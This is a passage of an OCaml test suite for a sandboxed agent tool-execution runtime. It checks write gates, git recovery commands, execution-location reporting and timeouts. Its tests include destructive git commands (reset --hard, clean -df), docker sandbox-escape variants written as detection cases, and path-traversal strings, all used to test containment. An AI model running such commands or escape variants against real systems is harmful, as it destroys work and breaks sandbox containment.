  with_eio_fs @@ fun () ->
  let base_path, config, meta, repo_dir =
    setup_deleted_tracked_files_sandbox_repo
      ~keeper_name:"stale-direct-git-checkout-head"
  in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let raw =
    Keeper_tool_command_runtime.handle_tool_execute
      ~turn_sandbox_factory:None
      ~exec_cache:None
      ~config
      ~meta
      ~args:
        (`Assoc
           [ "executable", `String "git"
           ; ( "argv"
             , `List
                 [ `String "checkout"
                 ; `String "HEAD"
                 ; `String "--"
                 ; `String "config/deleted-one.txt"
                 ; `String "test/fixtures/deleted-two.txt"
                 ] )
           ; "cwd", `String "repos/masc"
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "recovery checkout succeeds" true
    (json |> Json.member "ok" |> Json.to_bool);
  Alcotest.(check bool) "write gate did not block recovery checkout" false
    (String_util.contains_substring raw "write_operation_gated");
  Alcotest.(check bool) "stale gate did not block recovery checkout" false
    (String_util.contains_substring raw "sandbox_repo_stale");
  Alcotest.(check bool) "first tracked file restored" true
    (Sys.file_exists (Filename.concat repo_dir "config/deleted-one.txt"));
  Alcotest.(check bool) "second tracked file restored" true
    (Sys.file_exists (Filename.concat repo_dir "test/fixtures/deleted-two.txt"))

let test_tool_execute_allows_preserved_direct_repo_git_reset_hard_head () =
  with_eio_fs @@ fun () ->
  let base_path, config, meta, _repo_dir =
    setup_preserved_sandbox_repo ~keeper_name:"stale-direct-git-reset-head"
  in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let raw =
    Keeper_tool_command_runtime.handle_tool_execute
      ~turn_sandbox_factory:None
      ~exec_cache:None
      ~config
      ~meta
      ~args:
        (`Assoc
           [ "executable", `String "git"
           ; "argv", `List [ `String "reset"; `String "--hard"; `String "HEAD" ]
           ; "cwd", `String "repos/masc"
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "recovery reset succeeds" true
    (json |> Json.member "ok" |> Json.to_bool);
  Alcotest.(check bool) "write gate did not block recovery reset" false
    (String_util.contains_substring raw "write_operation_gated");
  Alcotest.(check bool) "stale gate did not block recovery reset" false
    (String_util.contains_substring raw "sandbox_repo_stale")

let test_tool_execute_allows_preserved_direct_repo_git_clean_df () =
  with_eio_fs @@ fun () ->
  let base_path, config, meta, repo_dir =
    setup_preserved_sandbox_repo ~keeper_name:"stale-direct-git-clean-df"
  in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let dirty_path = Filename.concat repo_dir "local-dirty.txt" in
  Alcotest.(check bool) "dirty fixture exists before clean" true
    (Sys.file_exists dirty_path);
  let raw =
    Keeper_tool_command_runtime.handle_tool_execute
      ~turn_sandbox_factory:None
      ~exec_cache:None
      ~config
      ~meta
      ~args:
        (`Assoc
           [ "executable", `String "git"
           ; "argv", `List [ `String "clean"; `String "-df" ]
           ; "cwd", `String "repos/masc"
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "recovery clean succeeds" true
    (json |> Json.member "ok" |> Json.to_bool);
  Alcotest.(check bool) "stale gate did not block recovery clean" false
    (String_util.contains_substring raw "sandbox_repo_stale");
  Alcotest.(check bool) "dirty fixture removed by clean" false
    (Sys.file_exists dirty_path)

let test_tool_execute_git_recovery_invalidates_repo_currency_cache () =
  with_eio_fs @@ fun () ->
  let base_path, config, meta, _repo_dir =
    setup_preserved_sandbox_repo ~keeper_name:"stale-direct-git-clean-cache"
  in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let run executable argv =
    Keeper_tool_command_runtime.handle_tool_execute
      ~turn_sandbox_factory:None
      ~exec_cache:None
      ~config
      ~meta
      ~args:
        (`Assoc
           [ "executable", `String executable
           ; "argv", `List (List.map (fun arg -> `String arg) argv)
           ; "cwd", `String "repos/masc"
           ])
      ()
  in
  let stale_raw = run "cat" [ "README.md" ] in
  Alcotest.(check bool) "initial read populates stale cache" true
    (String_util.contains_substring stale_raw "sandbox_repo_stale");
  let clean_raw = run "git" [ "clean"; "-df" ] in
  let clean_json = Yojson.Safe.from_string clean_raw in
  Alcotest.(check bool) "recovery clean succeeds" true
    (clean_json |> Json.member "ok" |> Json.to_bool);
  let retry_raw = run "cat" [ "README.md" ] in
  Alcotest.(check bool) "immediate retry is not stale-cached" false
    (String_util.contains_substring retry_raw "sandbox_repo_stale");
  let retry_json = Yojson.Safe.from_string retry_raw in
  Alcotest.(check bool) "immediate retry succeeds" true
    (retry_json |> Json.member "ok" |> Json.to_bool);
  Alcotest.(check bool) "retry observes advanced repo" true
    (retry_json
     |> Json.member "output"
     |> Json.to_string
     |> fun output -> String_util.contains_substring output "v2")

let test_tool_execute_readonly_blocks_worktree_git_recovery () =
  with_eio_fs @@ fun () ->
  let base_path, config, meta, repo_dir =
    setup_preserved_sandbox_repo ~keeper_name:"worktree-git-recovery-block"
  in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  ensure_dir (Filename.concat repo_dir ".worktrees");
  git_ok ~cwd:repo_dir [ "worktree"; "add"; "-q"; "--detach"; ".worktrees/task"; "HEAD" ];
  let raw =
    Keeper_tool_command_runtime.handle_tool_execute
      ~turn_sandbox_factory:None
      ~exec_cache:None
      ~config
      ~meta
      ~args:
        (`Assoc
           [ "executable", `String "git"
           ; "argv", `List [ `String "clean"; `String "-df" ]
           ; "cwd", `String "repos/masc/.worktrees/task"
           ])
      ()
  in
  Alcotest.(check (option string)) "worktree recovery is write-gated"
    (Some "write_operation_gated")
    (parse_error_field raw)

let test_tool_execute_readonly_blocks_non_recovery_git_writes () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta =
    { (make_local_meta "non-recovery-git-write") with tool_access = [] }
  in
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  let repo_dir = Filename.concat playground "repos/masc" in
  ensure_dir repo_dir;
  git_ok ~cwd:repo_dir [ "init"; "-q"; "--initial-branch=main" ];
  let check argv =
    let raw =
      Keeper_tool_command_runtime.handle_tool_execute
        ~turn_sandbox_factory:None
        ~exec_cache:None
        ~config
        ~meta
        ~args:
          (`Assoc
             [ "executable", `String "git"
             ; "argv", `List (List.map (fun arg -> `String arg) argv)
             ; "cwd", `String "repos/masc"
             ])
        ()
    in
    Alcotest.(check (option string)) "non-recovery git write is gated"
      (Some "write_operation_gated")
      (parse_error_field raw)
  in
  check [ "checkout"; "other-branch" ];
  check [ "reset"; "--hard"; "HEAD~1" ]

let test_tool_execute_elapsed_duration_preserves_positive_sub_ms () =
  let elapsed = Keeper_tool_command_runtime.For_testing.elapsed_duration_ms in
  Alcotest.(check int) "sub-ms positive duration rounds up to 1" 1
    (elapsed ~start_time:10.0 ~end_time:10.0004);
  Alcotest.(check int) "one ms duration stays one" 1
    (elapsed ~start_time:10.0 ~end_time:10.001);
  Alcotest.(check int) "negative clock drift is zero" 0
    (elapsed ~start_time:10.0 ~end_time:9.999);
  Alcotest.(check int) "nan duration is zero" 0
    (elapsed ~start_time:Float.nan ~end_time:10.0)

let classification family =
  { Exec_core.family = family
  ; reversibility = Exec_core.Read_only
  ; risk = Exec_core.Low
  ; risk_class = Masc_exec.Shell_ir_risk.R0_Read
  }
;;

let test_git_exit_128_emits_typed_deterministic_retry_marker () =
  let fields =
    Keeper_tool_command_runtime.For_testing.deterministic_retry_fields_for_process_result
      ~classification:(classification Exec_core.Git_read)
      ~status:(Unix.WEXITED 128)
  in
  let json = `Assoc fields in
  let marker = json |> Json.member "deterministic_retry" in
  Alcotest.(check string)
    "reason"
    "git_precondition_failed"
    (marker |> Json.member "reason" |> Json.to_string);
  Alcotest.(check bool)
    "retry_same_args=false"
    false
    (marker |> Json.member "retry_same_args" |> Json.to_bool)

let test_non_git_exit_128_has_no_deterministic_retry_marker () =
  let fields =
    Keeper_tool_command_runtime.For_testing.deterministic_retry_fields_for_process_result
      ~classification:(classification Exec_core.Build)
      ~status:(Unix.WEXITED 128)
  in
  Alcotest.(check int) "no fields" 0 (List.length fields)

let test_tool_search_files_ir_timeout_floor_is_not_sub_io_latency () =
  let args = `Assoc [ "timeout_sec", `Float 1.0 ] in
  Alcotest.(check (float 0.001))
    "tool_search_files_ir native timeout floor"
    Keeper_tool_command_runtime.keeper_tool_execute_shell_ir_native_min_timeout_sec
    (Keeper_tool_execute_timeout.clamp_shell_timeout
       ~min_sec:Keeper_tool_command_runtime.keeper_tool_execute_shell_ir_native_min_timeout_sec
       ~default:Keeper_tool_execute_timeout.io_timeout_sec
       args)

let test_tool_search_files_ir_load_bearing_timeout_floor () =
  let check name args expected =
    Alcotest.(check (float 0.001))
      name
      expected
      (Keeper_tool_execute_timeout.keeper_tool_execute_shell_ir_min_timeout_sec_for_args args)
  in
  check
    "trivial command keeps native floor"
    (`Assoc [ "executable", `String "echo"; "argv", `List [ `String "ok" ] ])
    Keeper_tool_command_runtime.keeper_tool_execute_shell_ir_native_min_timeout_sec;
  check
    "git command uses tool dispatch floor"
    (`Assoc
       [ "executable", `String "git"
       ; "argv", `List [ `String "log"; `String "--oneline"; `String "-5" ]
       ])
    Keeper_tool_execute_timeout.tool_dispatch_min_timeout_sec;
  check
    "recursive grep keeps native floor"
    (`Assoc
       [ "executable", `String "grep"
       ; "argv", `List [ `String "-rn"; `String "Yojson"; `String "." ]
       ])
    Keeper_tool_command_runtime.keeper_tool_execute_shell_ir_native_min_timeout_sec;
  check
    "pipeline inherits load-bearing floor"
    (`Assoc
       [ ( "pipeline"
         , `List
             [ `Assoc [ "executable", `String "rg"; "argv", `List [ `String "x" ] ]
             ; `Assoc [ "executable", `String "head"; "argv", `List [ `String "-5" ] ]
             ] )
       ])
    Keeper_tool_execute_timeout.tool_dispatch_min_timeout_sec
;;

let test_nested_runtime_detector_ignores_git_commit_message () =
  Alcotest.(check bool)
    "quoted docker in git commit message is not a nested runtime"
    false
    (Keeper_sandbox_docker.command_uses_nested_container_runtime
       "git commit -m 'docs: Docker sandbox proof'");
  Alcotest.(check bool)
    "unquoted docker argument is not a nested runtime unless command-position"
    false
    (Keeper_sandbox_docker.command_uses_nested_container_runtime
       "git commit -m Docker-sandbox-proof");
  Alcotest.(check bool)
    "docker after command separator is still blocked"
    true
    (Keeper_sandbox_docker.command_uses_nested_container_runtime
       "git status && docker run --rm alpine true");
  Alcotest.(check bool)
    "docker after compact separator is still blocked"
    true
    (Keeper_sandbox_docker.command_uses_nested_container_runtime
       "git status;docker run --rm alpine true");
  Alcotest.(check bool)
    "quoted separator text is not a command boundary"
    false
    (Keeper_sandbox_docker.command_uses_nested_container_runtime
       "git commit -m 'status;docker run --rm alpine true'");
  Alcotest.(check bool)
    "quoted docker command word is still blocked"
    true
    (Keeper_sandbox_docker.command_uses_nested_container_runtime
       "\"docker\" run --rm alpine true");
  Alcotest.(check bool)
    "partially quoted docker command word is still blocked"
    true
    (Keeper_sandbox_docker.command_uses_nested_container_runtime
       "do\"cker\" run --rm alpine true");
  Alcotest.(check bool)
    "env option wrapper still exposes docker command"
    true
    (Keeper_sandbox_docker.command_uses_nested_container_runtime
       "env -i docker run --rm alpine true");
  Alcotest.(check bool)
    "env terminator still exposes docker command"
    true
    (Keeper_sandbox_docker.command_uses_nested_container_runtime
       "env -- docker run --rm alpine true");
  Alcotest.(check bool)
    "env value option does not treat its argument as command"
    false
    (Keeper_sandbox_docker.command_uses_nested_container_runtime
       "env -u docker git commit -m Docker-sandbox-proof");
  Alcotest.(check bool)
    "env split-string wrapper still exposes docker command"
    true
    (Keeper_sandbox_docker.command_uses_nested_container_runtime
       "env -S 'docker run --rm alpine true'");
  Alcotest.(check bool)
    "env inline split-string wrapper still exposes docker command"
    true
    (Keeper_sandbox_docker.command_uses_nested_container_runtime
       "env --split-string='docker run --rm alpine true'");
  Alcotest.(check bool)
    "env split-string assignment without runtime remains allowed"
    false
    (Keeper_sandbox_docker.command_uses_nested_container_runtime
       "env -S 'FOO=docker git commit -m Docker-sandbox-proof'");
  Alcotest.(check bool)
    "quoted socket text is not a nested docker runtime"
    false
    (Keeper_sandbox_docker.command_uses_nested_container_runtime
       "git commit -m \"mention /var/run/docker.sock in review text\"");
  Alcotest.(check bool) "shell -c docker runtime is blocked" true
    (Keeper_sandbox_docker.command_uses_nested_container_runtime
       "bash -lc \"docker run --rm alpine true\"");
  Alcotest.(check bool) "command substitution docker runtime is blocked" true
    (Keeper_sandbox_docker.command_uses_nested_container_runtime
       "echo $(docker run --rm alpine true)");
  Alcotest.(check bool) "path-prefixed docker runtime is blocked" true
    (Keeper_sandbox_docker.command_uses_nested_container_runtime
       "/usr/bin/docker run --rm alpine true")

let test_docker_nested_guard_blocks_command_substitution () =
  Alcotest.(check bool) "command substitution docker runtime is blocked" true
    (Keeper_sandbox_docker.command_uses_nested_container_runtime
       "echo $(docker run --rm alpine true)")

let test_docker_nested_guard_blocks_path_prefixed_runtime () =
  Alcotest.(check bool) "path-prefixed docker runtime is blocked" true
    (Keeper_sandbox_docker.command_uses_nested_container_runtime
       "/usr/bin/docker run --rm alpine true")

let test_playground_guard_traversal () =
  let pg = "/project/.masc/playground/cheolsu" in
  (* After realpath, ".../cheolsu/repos/../../lib" becomes "/project/lib" *)
  Alcotest.(check bool) "traversal resolves outside (canonicalized)"
    false (is_inside_playground ~playground_abs:pg "/project/lib");
  (* After realpath, ".../cheolsu/repos/../../../.masc" becomes "/project/.masc" *)
  Alcotest.(check bool) "traversal to .masc (canonicalized)"
    false (is_inside_playground ~playground_abs:pg "/project/.masc");
  (* The raw non-canonical form would match the prefix — this proves
     we MUST canonicalize before checking *)
  let raw_traversal = pg ^ "/repos/masc/../../../../../../lib" in
  let would_match_raw = String.starts_with ~prefix:(pg ^ "/") raw_traversal in
  Alcotest.(check bool) "raw traversal WOULD match prefix (proves canonicalization needed)"
    true would_match_raw

(* ── tool_search_files readonly hints teach the model about alternatives ───── *)

let make_readonly_meta name =
  let meta = make_base_meta ~context:"make_readonly_meta" name in
  { meta with goal = "readonly hint test" }

let make_write_enabled_meta name =
  let json =
    `Assoc
      [
        ("name", `String name);
        ("agent_name", `String ("agent-" ^ name));
        ("trace_id", `String ("trace-" ^ name));
        ( "tool_access",
          Keeper_meta_tool_access.tool_access_to_json
            (["tool_edit_file"; "tool_write_file"]) );
      ]
  in
  match Masc_test_deps.meta_of_json_fixture json with
  | Ok meta -> { meta with goal = "write-enabled Execute test" }
  | Error err -> Alcotest.fail ("make_write_enabled_meta failed: " ^ err)

let parse_hint raw =
  Yojson.Safe.from_string raw
  |> Json.member "hint"
  |> Json.to_string_option

let test_tool_execute_runtime_error_reports_default_execution_location () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "exec-location" in
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  let playground_canonical = normalize_path_for_containment playground in
  ensure_dir playground;
  let raw =
    Keeper_tool_command_runtime.handle_tool_execute
      ~turn_sandbox_factory:None
      ~exec_cache:None
      ~config
      ~meta
      ~args:
        (`Assoc
           [ "executable", `String "ls"
           ; "argv", `List [ `String "definitely-missing" ]
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "runtime failure is surfaced" false
    (json |> Json.member "ok" |> Json.to_bool);
  Alcotest.(check string) "top-level cwd is default playground" playground
    (json |> Json.member "cwd" |> Json.to_string);
  let loc = json |> Json.member "execution_location" in
  Alcotest.(check string) "scope" "playground_root"
    (loc |> Json.member "scope" |> Json.to_string);
  Alcotest.(check string) "cwd source" "default_playground_root"
    (loc |> Json.member "cwd_source" |> Json.to_string);
  Alcotest.(check string) "relative cwd" "."
    (loc |> Json.member "relative_cwd" |> Json.to_string);
  Alcotest.(check string) "relative path base" playground_canonical
    (loc |> Json.member "relative_path_base" |> Json.to_string);
  Alcotest.(check bool) "argv paths resolve against cwd" true
    (loc
     |> Json.member "argv_relative_paths_resolve_against_cwd"
     |> Json.to_bool);
  Alcotest.(check bool) "no worktree selected" false
    (loc |> Json.member "worktree_selected" |> Json.to_bool);
  Alcotest.(check bool) "selected worktree is absent" true
    (match loc |> Json.member "selected_worktree" with
     | `Null -> true
     | _ -> false)

let test_execution_location_classifies_repo_worktree_subpath () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  let meta = make_readonly_meta "exec-location-worktree" in
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  let cwd =
    Filename.concat playground "repos/masc/.worktrees/task-123/lib"
  in
  let loc =
    Masc.Keeper_tool_execute_path.execution_location_json
      ~config
      ~meta
      ~args:
        (`Assoc
           [ ( "cwd"
             , `String "repos/masc/.worktrees/task-123/lib" )
           ])
      ~cwd
  in
  Alcotest.(check string) "scope" "repo_worktree_subpath"
    (loc |> Json.member "scope" |> Json.to_string);
  Alcotest.(check string) "cwd source" "explicit_cwd"
    (loc |> Json.member "cwd_source" |> Json.to_string);
  Alcotest.(check string) "repo name" "masc"
    (loc |> Json.member "repo_name" |> Json.to_string);
  Alcotest.(check bool) "worktree selected" true
    (loc |> Json.member "worktree_selected" |> Json.to_bool);
  Alcotest.(check string) "worktree name" "task-123"
    (loc |> Json.member "worktree_name" |> Json.to_string);
  Alcotest.(check string)
    "relative cwd"
    "repos/masc/.worktrees/task-123/lib"
    (loc |> Json.member "relative_cwd" |> Json.to_string);
  Alcotest.(check string)
    "repo root"
    (normalize_path_for_containment
       (Filename.concat playground "repos/masc"))
    (loc |> Json.member "repo_root" |> Json.to_string);
  Alcotest.(check string)
    "worktree root"
    (normalize_path_for_containment
       (Filename.concat playground "repos/masc/.worktrees/task-123"))
    (loc |> Json.member "worktree_root" |> Json.to_string);
  let selected = loc |> Json.member "selected_worktree" in
  Alcotest.(check string) "selected repo name" "masc"
    (selected |> Json.member "repo_name" |> Json.to_string);
  Alcotest.(check string) "selected worktree name" "task-123"
    (selected |> Json.member "worktree_name" |> Json.to_string);
  Alcotest.(check string) "selection source" "execution_cwd"
    (selected |> Json.member "selection_source" |> Json.to_string);
  Alcotest.(check string) "selected worktree scope" "repo_worktree_subpath"
    (selected |> Json.member "scope" |> Json.to_string);
  Alcotest.(check string)
    "selected worktree root"
    (normalize_path_for_containment
       (Filename.concat playground "repos/masc/.worktrees/task-123"))
    (selected |> Json.member "worktree_root" |> Json.to_string)

let test_execution_location_outside_playground_has_null_relative_cwd () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  let meta = make_readonly_meta "exec-location-outside" in
  let cwd = Filename.concat base_path "outside" in
  let loc =
    Masc.Keeper_tool_execute_path.execution_location_json
      ~config
      ~meta
      ~args:(`Assoc [ "cwd", `String cwd ])
      ~cwd
  in
  Alcotest.(check string) "scope" "outside_playground"
    (loc |> Json.member "scope" |> Json.to_string);
  Alcotest.(check string) "cwd source" "explicit_cwd"
    (loc |> Json.member "cwd_source" |> Json.to_string);
  Alcotest.(check bool) "relative cwd is not applicable" true
    (match loc |> Json.member "relative_cwd" with
     | `Null -> true
     | _ -> false)

let test_tool_execute_typed_process_runs_via_shell_ir () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "typed-exec" in
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  ensure_dir playground;
  let raw =
    Keeper_tool_command_runtime.handle_tool_execute
      ~turn_sandbox_factory:None
      ~exec_cache:None
      ~config
      ~meta
      ~args:
        (`Assoc
           [ "executable", `String "printf"
           ; "argv", `List [ `String "typed-ok" ]
           ; "cwd", `String playground
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "typed exec succeeds" true
    (json |> Json.member "ok" |> Json.to_bool);
  Alcotest.(check bool) "typed flag" true
    (json |> Json.member "typed" |> Json.to_bool);
  Alcotest.(check bool) "output from native argv" true
    (json
     |> Json.member "output"
     |> Json.to_string
     |> fun output -> String_util.contains_substring output "typed-ok")

let test_tool_execute_typed_duplicate_argv0_rejected_before_runtime () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "typed-duplicate-argv0" in
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  ensure_dir playground;
  ignore
    (Fs_compat.save_file_atomic
       (Filename.concat playground "keeper_sandbox.mli")
       "(** Keeper_sandbox contract fixture. *)\n");
  let raw =
    Keeper_tool_command_runtime.handle_tool_execute
      ~turn_sandbox_factory:None
      ~exec_cache:None
      ~config
      ~meta
      ~args:
        (`Assoc
           [ "executable", `String "cat"
           ; "argv", `List [ `String "cat"; `String "-n"; `String "keeper_sandbox.mli" ]
           ; "cwd", `String playground
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  let err = json |> Json.member "error" |> Json.to_string in
  Alcotest.(check bool)
    "error explains argv0 contract"
    true
    (String_util.contains_substring err "repeated as argv[0]");
  Alcotest.(check bool)
    "file content did not leak into validation error"
    false
    (String_util.contains_substring raw "Keeper_sandbox contract fixture")

let test_tool_execute_typed_failure_error_prefers_stderr () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "typed-failure-stderr" in
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  ensure_dir playground;
  ignore
    (Fs_compat.save_file_atomic
       (Filename.concat playground "keeper_sandbox.mli")
       "(** Keeper_sandbox contract fixture. *)\n");
  let raw =
    Keeper_tool_command_runtime.handle_tool_execute
      ~turn_sandbox_factory:None
      ~exec_cache:None
      ~config
      ~meta
      ~args:
        (`Assoc
           [ "executable", `String "cat"
           ; "argv", `List [ `String "keeper_sandbox.mli"; `String "missing-file" ]
           ; "cwd", `String playground
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "cat failure is not ok" false
    (json |> Json.member "ok" |> Json.to_bool);
  let err = json |> Json.member "error" |> Json.to_string in
  Alcotest.(check bool)
    "top-level error uses stderr"
    true
    (String_util.contains_substring err "No such file or directory");
  Alcotest.(check bool)
    "top-level error excludes stdout file dump"
    false
    (String_util.contains_substring err "Keeper_sandbox contract fixture");
  Alcotest.(check bool)
    "raw output still preserves stdout for debugging"
    true
    (json
     |> Json.member "output"
     |> Json.to_string
     |> fun output -> String_util.contains_substring output "Keeper_sandbox contract fixture");
  let normalized =
    Masc.Keeper_tools_oas.normalize_tool_result ~success:false raw
    |> Yojson.Safe.from_string
  in
  let normalized_error = normalized |> Json.member "error" |> Json.to_string in
  Alcotest.(check bool)
    "OAS-normalized error also uses stderr"
    true
    (String_util.contains_substring normalized_error "No such file or directory");
  Alcotest.(check bool)
    "OAS-normalized error excludes stdout file dump"
    false
    (String_util.contains_substring
       normalized_error
       "Keeper_sandbox contract fixture")

let test_tool_execute_typed_pipeline_runs_via_shell_ir () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "typed-pipeline" in
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  ensure_dir playground;
  let raw =
    Keeper_tool_command_runtime.handle_tool_execute
      ~turn_sandbox_factory:None
      ~exec_cache:None
      ~config
      ~meta
      ~args:
        (`Assoc
           [ ( "pipeline"
             , `List
                 [ `Assoc
                     [ "executable", `String "printf"
                     ; "argv", `List [ `String "typed" ]
                     ]
                 ; `Assoc
                     [ "executable", `String "wc"
                     ; "argv", `List [ `String "-c" ]
                     ]
                 ] )
           ; "cwd", `String playground
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "typed pipeline succeeds" true
    (json |> Json.member "ok" |> Json.to_bool);
  Alcotest.(check bool) "typed flag" true
    (json |> Json.member "typed" |> Json.to_bool);
  Alcotest.(check bool) "wc sees piped stdin" true
    (json
     |> Json.member "output"
     |> Json.to_string
     |> fun output -> String_util.contains_substring output "5")

let test_tool_execute_typed_docker_falls_back_to_local_playground () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta =
    { (make_docker_meta "typed-docker") with
      sandbox_image = Some "masc-test-missing-image:typed-fallback"
    }
  in
  let playground = Keeper_sandbox.host_root_abs_of_meta ~config meta in
  ensure_dir playground;
  let raw =
    Keeper_tool_command_runtime.handle_tool_execute
      ~turn_sandbox_factory:None
      ~exec_cache:None
      ~config
      ~meta
      ~args:
        (`Assoc
           [ "executable", `String "printf"
           ; "argv", `List [ `String "typed-docker" ]
           ; "cwd", `String playground
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "typed docker fallback succeeds" true
    (json |> Json.member "ok" |> Json.to_bool);
  Alcotest.(check (option string))
    "requested docker sandbox"
    (Some "docker")
    (json |> Json.member "requested_sandbox" |> Json.to_string_option);
  Alcotest.(check (option string))
    "falls back to local playground"
    (Some "local_playground")
    (json |> Json.member "sandbox_fallback" |> Json.to_string_option);
  Alcotest.(check bool) "output propagated" true
    (json
     |> Json.member "output"
     |> Json.to_string
     |> fun output -> String_util.contains_substring output "typed-docker")

let test_tool_search_files_find_accepts_name_alias () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "find-name-alias" in
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  ensure_dir playground;
  let lib_dir = Filename.concat playground "lib" in
  ensure_dir lib_dir;
  ignore (Fs_compat.save_file_atomic (Filename.concat lib_dir "demo.ml") "let x = 1\n");
  let raw =
    Keeper_tool_command_runtime.handle_tool_search_files
      ~turn_sandbox_factory:None ~exec_cache:None
      ~config ~meta
      ~args:
        (`Assoc
           [
             ("op", `String "find");
             ("path", `String "lib");
             ("name", `String "*.ml");
             ("limit", `Int 5);
           ])
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "name alias succeeds" true
    (json |> Json.member "ok" |> Json.to_bool);
  Alcotest.(check string) "alias populates name field" "*.ml"
    (json |> Json.member "name" |> Json.to_string)

let test_tool_search_files_ls_rejects_doubled_playground_prefix () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "masc-improver" in
  let playground =
    Filename.concat base_path (playground_path_of meta.name)
  in
  let repos = Filename.concat playground "repos" in
  ensure_dir repos;
  ignore (Fs_compat.save_file_atomic (Filename.concat repos "demo.txt") "ok");
  let doubled_path =
    Filename.concat playground ((playground_path_of meta.name) ^ "repos")
  in
  let raw =
    Keeper_tool_command_runtime.handle_tool_search_files
      ~turn_sandbox_factory:None ~exec_cache:None
      ~config ~meta
      ~args:(`Assoc [
        ("op", `String "ls");
        ("path", `String doubled_path);
      ])
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "ls rejects doubled playground prefix" false
    (json |> Json.member "ok" |> Json.to_bool);
  (match json |> Json.member "error" |> Json.to_string_option with
   | Some err ->
     Alcotest.(check bool)
       "error rejects absolute doubled path"
       true
       (String_util.contains_substring err "absolute paths are not allowed")
   | None -> Alcotest.fail ("expected path rejection, got: " ^ raw))

let test_tool_search_files_retired_command_op_is_unsupported () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "retired-command-unsupported" in
  let raw =
    Keeper_tool_command_runtime.handle_tool_search_files
      ~turn_sandbox_factory:None ~exec_cache:None
      ~config ~meta
      ~args:(`Assoc [
        ("op", `String "bash");
        ("command", `String "git status && git log --oneline -5");
      ])
  in
  Alcotest.(check (option string)) "error is unsupported"
    (Some "unsupported_op") (parse_error_field raw);
  let json = Yojson.Safe.from_string raw in
  let supported_ops = json |> Json.member "supported_ops" |> Json.to_list in
  Alcotest.(check bool) "retired command op not supported" false
    (List.mem (`String "bash") supported_ops)

let test_tool_search_files_retired_command_op_does_not_execute () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "retired-command-no-exec" in
  let playground =
    Filename.concat base_path (playground_path_of meta.name)
  in
  ensure_dir playground;
  let marker = Filename.concat playground "should-not-exist" in
  let raw =
    Keeper_tool_command_runtime.handle_tool_search_files
      ~turn_sandbox_factory:None ~exec_cache:None
      ~config ~meta
      ~args:(`Assoc [
        ("op", `String "bash");
        ("command", `String "touch should-not-exist");
      ])
  in
  Alcotest.(check (option string)) "error is unsupported"
    (Some "unsupported_op") (parse_error_field raw);
  Alcotest.(check bool) "retired command op did not execute" false
    (Sys.file_exists marker)

let test_rewrite_turn_runtime_paths_to_host () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
